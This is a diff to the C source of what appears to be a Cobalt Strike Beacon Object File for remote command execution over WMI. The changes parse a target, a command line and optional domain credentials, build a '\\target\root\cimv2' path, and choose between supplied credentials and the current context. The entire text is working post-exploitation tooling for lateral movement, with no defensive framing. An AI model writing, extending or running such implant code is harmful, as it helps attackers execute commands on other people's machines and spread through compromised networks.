@@ -14,7 +14,6 @@
 #pragma comment(lib, "comsuppw.lib")
 #pragma comment(lib, "comsuppwd.lib")
 
-
  /* spare us some name mangling... */
 extern "C" {
 
@@ -35,6 +34,7 @@ extern "C" {
 	DECLSPEC_IMPORT 	WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
 	DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
+	DECLSPEC_IMPORT 	int      WINAPI		MSVCRT$swprintf(wchar_t* buffer, const wchar_t* format, ...);
 	
 	}
 
@@ -105,18 +105,43 @@ void go(char* buff, int len) {
 	wchar_t* bwdomain;
 	wchar_t* bwcommandline;
 	wchar_t* bwtarget2;
-	int IsCurrent;
+	int IsCurrent = 1;
 	
+	bwdomain = L"";
+	bwusername = L"";
+	bwpassword = L"";
+
 	//BeaconDataParse(&parser, buf, len);
 	BeaconDataParse(&parser, buff, len);
 	{
 		bwtarget2 =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+		bwcommandline =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+		//IsCurrent = BeaconDataInt(&parser);
 		bwdomain =	(wchar_t*)BeaconDataExtract(&parser, NULL);
 		bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
 		bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
-		bwcommandline =	(wchar_t*)BeaconDataExtract(&parser, NULL);
-		IsCurrent = BeaconDataInt(&parser);
 	}
+
+	// Prepend "\\\\" to bwtarget2
+	wchar_t* bwtarget = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (MSVCRT$wcslen(bwtarget2) + 3) * sizeof(wchar_t));
+	MSVCRT$swprintf(bwtarget, L"\\\\%s", bwtarget2);
+
+	// Append "\\root\\cimv2" to bwtarget
+	wchar_t* bwtarget3 = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (MSVCRT$wcslen(bwtarget) + 12) * sizeof(wchar_t));
+	MSVCRT$swprintf(bwtarget3, L"%s\\root\\cimv2", bwtarget);
+
+	// Set bwtarget2 to bwtarget3
+	bwtarget2 = bwtarget3;
+
+	// if domain, username, or password were supplied, set IsCurrent to 0
+	if (MSVCRT$wcslen(bwdomain) > 0 || MSVCRT$wcslen(bwusername) > 0 || MSVCRT$wcslen(bwpassword) > 0) {
+		IsCurrent = 0;
+		BeaconPrintf(CALLBACK_OUTPUT, "Using supplied credentials\n");
+	} else {
+		BeaconPrintf(CALLBACK_OUTPUT, "Using current context\n");
+	}
+
+	BeaconPrintf(CALLBACK_OUTPUT, "Command: %ls\n", bwcommandline);
 
 	CreateCreds(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent);
 
